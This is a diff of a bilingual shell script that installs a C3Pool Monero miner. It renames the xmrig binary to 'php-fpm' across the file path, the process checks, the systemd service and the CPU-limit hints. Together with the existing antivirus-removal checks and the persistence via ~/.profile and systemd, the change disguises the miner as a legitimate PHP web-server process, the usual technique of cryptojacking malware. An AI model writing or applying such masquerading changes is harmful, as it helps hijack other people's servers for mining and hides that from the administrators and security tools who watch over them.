@@ -181,18 +181,18 @@ if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
-
-echo "[*] Checking if advanced version of $HOME/c3pool/xmrig works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HOME/c3pool/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
+mv $HOME/c3pool/xmrig $HOME/c3pool/php-fpm
+echo "[*] Checking if advanced version of $HOME/c3pool/php-fpm works fine (and not removed by antivirus software)"
+echo "[*] 检查目录 $HOME/c3pool/php-fpm 中的php-fpm是否运行正常 (或者是否被杀毒软件误杀)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/c3pool/config.json
-$HOME/c3pool/xmrig --help >/dev/null
+$HOME/c3pool/php-fpm --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/c3pool/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/c3pool/xmrig is not functional"
-	echo "警告: 版本 $HOME/c3pool/xmrig 无法正常工作"
+  if [ -f $HOME/c3pool/php-fpm ]; then
+    echo "WARNING: Advanced version of $HOME/c3pool/php-fpm is not functional"
+	echo "警告: 版本 $HOME/c3pool/php-fpm 无法正常工作"
   else 
-    echo "WARNING: Advanced version of $HOME/c3pool/xmrig was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HOME/c3pool/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
+    echo "WARNING: Advanced version of $HOME/c3pool/php-fpm was removed by antivirus (or some other problem)"
+	echo "警告: 该目录 $HOME/c3pool/php-fpm 下的xmrig已被杀毒软件删除 (或其它问题)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -215,25 +215,26 @@ if (test $? -ne 0); then
 	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool 目录下"
   fi
   rm /tmp/xmrig.tar.gz
+  mv $HOME/c3pool/xmrig $HOME/c3pool/php-fpm
 
-  echo "[*] Checking if stock version of $HOME/c3pool/xmrig works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HOME/c3pool/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
+  echo "[*] Checking if stock version of $HOME/c3pool/php-fpm works fine (and not removed by antivirus software)"
+  echo "[*] 检查目录 $HOME/c3pool/php-fpm 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
-  $HOME/c3pool/xmrig --help >/dev/null
+  $HOME/c3pool/php-fpm --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/c3pool/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/c3pool/xmrig is not functional too"
-	  echo "发生错误: 该目录中的 $HOME/c3pool/xmrig 也无法使用"
+    if [ -f $HOME/c3pool/php-fpm ]; then
+      echo "ERROR: Stock version of $HOME/c3pool/php-fpm is not functional too"
+	  echo "发生错误: 该目录中的 $HOME/c3pool/php-fpm 也无法使用"
     else 
-      echo "ERROR: Stock version of $HOME/c3pool/xmrig was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HOME/c3pool/xmrig 已被杀毒软件删除"
+      echo "ERROR: Stock version of $HOME/c3pool/php-fpm was removed by antivirus too"
+	  echo "发生错误: 该目录中的 $HOME/c3pool/php-fpm 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/c3pool/xmrig is OK"
-echo "[*] 矿工 $HOME/c3pool/xmrig 运行正常"
+echo "[*] Miner $HOME/c3pool/php-fpm is OK"
+echo "[*] 矿工 $HOME/c3pool/php-fpm 运行正常"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -262,13 +263,13 @@ echo "[*] Creating $HOME/c3pool/miner.sh script"
 echo "[*] 在该目录下创建 $HOME/c3pool/miner.sh 脚本"
 cat >$HOME/c3pool/miner.sh <<EOL
 #!/bin/bash
-if ! pidof xmrig >/dev/null; then
-  nice $HOME/c3pool/xmrig \$*
+if ! pidof php-fpm >/dev/null; then
+  nice $HOME/c3pool/php-fpm \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
+  echo "Run \"killall php-fpm\" or \"sudo killall php-fpm\" if you want to remove background miner first."
   echo "门罗币矿工已经在后台运行。 拒绝运行另一个."
-  echo "如果要先删除后台矿工，请运行 \"killall xmrig\" 或 \"sudo killall xmrig\"."
+  echo "如果要先删除后台矿工，请运行 \"killall php-fpm\" 或 \"sudo killall php-fpm\"."
 fi
 EOL
 
@@ -285,7 +286,7 @@ if ! sudo -n true 2>/dev/null; then
     echo "Looks like $HOME/c3pool/miner.sh script is already in the $HOME/.profile"
 	echo "脚本 $HOME/c3pool/miner.sh 已存在于 $HOME/.profile 中."
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/c3pool/xmrig.log file)"
+  echo "[*] Running miner in the background (see logs in $HOME/c3pool/php-fpm.log file)"
   echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/xmrig.log 日志文件)"
   /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
 else
@@ -299,8 +300,8 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/c3pool/xmrig.log file)"
-	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/xmrig.log 日志文件)"
+    echo "[*] Running miner in the background (see logs in $HOME/c3pool/php-fpm.log file)"
+	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/php-fpm.log 日志文件)"
     /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
@@ -313,7 +314,7 @@ else
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
+ExecStart=$HOME/c3pool/php-fpm --config=$HOME/c3pool/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -324,7 +325,7 @@ EOL
     sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
     echo "[*] Starting c3pool_miner systemd service"
 	echo "[*] 启动c3pool_miner systemd服务"
-    sudo killall xmrig 2>/dev/null
+    sudo killall php-fpm 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable c3pool_miner.service
     sudo systemctl start c3pool_miner.service
@@ -339,11 +340,11 @@ echo "提示: 如果您使用共享VPS，建议避免由矿工产生100％的CPU
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
+  echo "sudo cpulimit -e php-fpm -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$acpulimit -e php-fpm -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   else
-    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$i \\cpulimit -e php-fpm -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
